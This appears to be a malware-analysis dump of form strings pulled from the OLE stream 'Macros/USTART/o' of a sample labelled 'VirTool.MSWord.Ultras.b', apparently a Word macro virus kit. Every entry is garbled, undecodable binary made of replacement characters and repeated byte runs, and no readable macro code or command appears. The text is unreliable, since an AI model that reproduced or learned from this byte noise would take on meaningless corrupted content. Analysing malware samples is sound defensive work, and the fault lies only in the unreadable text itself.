VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@N������������������������		

-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������$$&&&(((*))+++---/..0002113eeh������������99;::=;;><<?==@>>A??B@@C@@Dqqs���������DDGDDHEFGFGHFHHGJGGKGHLEIND���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4A%1<%.6$*0#&+!"&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ŀ�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ##%((*--/114������������FFIJJNNNRQQUUUYXX]\\`__dbbgeej������������rrwttzvv|xx~yyxx�xx�ww�ww����������������������������������������pq�pq�pq�pp�pp�pp�pp�pp�pp�pq����������������������������������ww�xx�xxww}ttyppvmmriio��ډ��]]bYY]TTYPPTKKNEEI@@C::=447..1((*""#TTV����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������pp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@S������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������  """###%%%''')((+**,,,.--/cce������������55866977:88;99<::=;;><<?==@nnq���������AADBCDBCECDECEEDGDEGDFJCFLB���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5B%1<%.6$*0#',!#(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J@@{������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������ddd
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!$$&((*--/XXZ������������FFJJJNNNRRRVUUZYY]\\a``dcchffk������������rrxuuzvv|xx~yyxx�ww�ww�vw����������������������������������������qr�qr�qr�qq�qq�qq�qq�qr�qr�qr����������������������������������xxww~uu{rrxooullqhhneej���]]bYY]TTYPPTKKOFFIAAD;;>668002**,$$%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QQR����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
⟟�������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%@@Y������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!###$$$&&&('')))+__b������������11422544655766977:88;99<::=lln���������>>A?@A?@A@ABACBBDACFACG@DJ?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5B%1<%.7%+2#',"$(  #
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ŀ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E@@w������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������666
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!$$&))+--0rrt������������GGJKKNOOSRRVVVZYY^]]a``ecchffk������������ssyuu{ww}yyxx�xx�ww�ww�vv����������������������������������������rs�rr�rr�rr�rr�rs�rs�rs�ss�ss������¹�¹�����������������������vv|ssyqqvnnskkpggmddi``e���XX]TTXPPTKKOFFJAAE<<?77:114++.%%'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MMN����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``�������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  �@@��������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,@@^������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   !!!###%%%&\\^������������--/..1002113225336447558669iik���������::=;<><=?=>?=?>?A>@C?@D=AG=���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5B%2=%/8$+1#(-#$(!!$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���^^^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?@@s������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������QQQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  !$$&))+..0���������������GGKKKOOOSSSWVV[ZZ^]]b``eddhggl������������ssyvv{xx}yyxx�xx�ww�vw�vv����������������������������������������ss�ss�ss�ss�ss�st�st�tt�tt�tt�uu�uu�uv�vv�vw�ww����������������rrwooullriioffkcch__d\\`mmpTTXPPTKKOGGJBBE==@88;225--/'')!!#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JJK����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pp�����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3@@c������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   "YYZ������������))+**,++.--/..0//1003114225YY\��ͦ��CCE77:89:89;9:;;<;<><<?;=B:osk���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5C%2=&/8$+2$(-#%)"!$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���PPP
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8@@n������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  !$$&))+������������������GGKKKOOOSSSWWW[ZZ_]]baafddiggl������������ttzvv|xx~yyxx�ww�ww�vv�vv����������������������������������������tt�tt�tt�tt�tt�tu�uu�uu�uu�uv�vv�vv�ww�ww�xx�xx���������������mmskkphhmeejbbg__c[[`WW\TTXPPTKKOGGJBBF>>A99;336..0))+##%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GGH����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������PP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
׿�����������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:@@h������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VVV������������$$&&&''')((*)),++-,,.--/..0//20031142253464465666877888:89=8FJD������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6C%2=%/8&+2$).#&*!"%  "
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PPU���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2@@i������������  c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  !@@A���������������������HHKLLOOOSSSWWW[ZZ_^^baafddiggl������������ttzvv|xx~yyxx�ww�ww�vv�vv����������������������������������������uu�uu�uu�uu�uu�uv�vv�vv�vw�ww�ww�xx�xx�xyxx~vv|���������������iiogglddiaaf^^bZZ_WW[SSWOOSKKOGGKCCF>>A99<447//2**,$$&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DDD����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``�������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pp����������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B@@n������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������


-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RRS������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!"""$##%%%'&&('')))+**,++-,,.--/..0//1012122233344464������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5B&2=%08%,3%).#&*##'!!#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@B���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,@@d������������@@t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
888���������������������������HHKLLOPPSSSWWW[ZZ_^^baafddiggl������������ttzvv|xx~xy�xx�ww�ww�vv�vv����������������������������������������uv�uv�vv�vv�vv�vw�ww�ww�xx�xx�xy�xxww}vv|ttzssx���������������eejcch``e]]aZZ^VV[SSWOOSKKOGGKCCF>>B::=558003++-&&(  "
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
			AAA����������
